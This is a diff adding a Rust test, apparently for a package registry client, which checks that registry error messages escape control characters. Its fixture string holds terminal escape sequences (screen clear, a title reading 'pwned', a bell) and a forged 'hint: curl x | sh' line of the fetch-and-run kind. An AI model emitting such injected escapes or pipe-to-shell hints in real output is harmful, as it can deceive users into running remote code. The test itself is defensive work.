@@ -141,3 +141,47 @@ fn a_network_error_suggests_a_retry() {
     assert_eq!(timeout.severity, Severity::Error);
     assert!(timeout.suggestion.as_ref().unwrap().contains("retry"));
 }
+
+/// What a registry sends back that a terminal acts on: a screen clear, a title write, a bell and a
+/// forged `hint:` line.
+const ODD: &str = "no \u{1b}[2J\u{1b}]0;pwned\u{7}\n  hint: curl x | sh";
+
+#[ignore = "flipped by T3"]
+#[specforge_test_macros::test(
+    behavior = "check_registry_reply",
+    verify = "the text a registry supplies is written in a diagnostic printable, each control character as its escape"
+)]
+fn a_registry_diagnostic_writes_the_registrys_text_printable() {
+    use specforge_registry_client::registry_ops::verify_registry_integrity;
+    use specforge_registry_wire::ErrorCode;
+    let s = || "x".to_string();
+    let mut diagnostics = vec![
+        RegistryError::Unauthorized {
+            guidance: ODD.into(),
+        },
+        RegistryError::Forbidden {
+            guidance: ODD.into(),
+        },
+        RegistryError::NetworkError {
+            message: ODD.into(),
+        },
+        RegistryError::Refused {
+            code: ErrorCode::BadRequest,
+            message: ODD.into(),
+        },
+        RegistryError::InvalidReply {
+            subject: s(),
+            message: ODD.into(),
+        },
+    ]
+    .into_iter()
+    .map(|error| error.to_diagnostic())
+    .collect::<Vec<_>>();
+    diagnostics.push(verify_registry_integrity(b"\0asm", ODD).unwrap_err());
+    for diagnostic in diagnostics {
+        let message = &diagnostic.message;
+        assert!(!message.contains(char::is_control), "{message:?}");
+        assert!(message.contains("\\u{1b}[2J"), "{message:?}");
+        assert!(message.contains("\\n  hint:"), "{message:?}");
+    }
+}
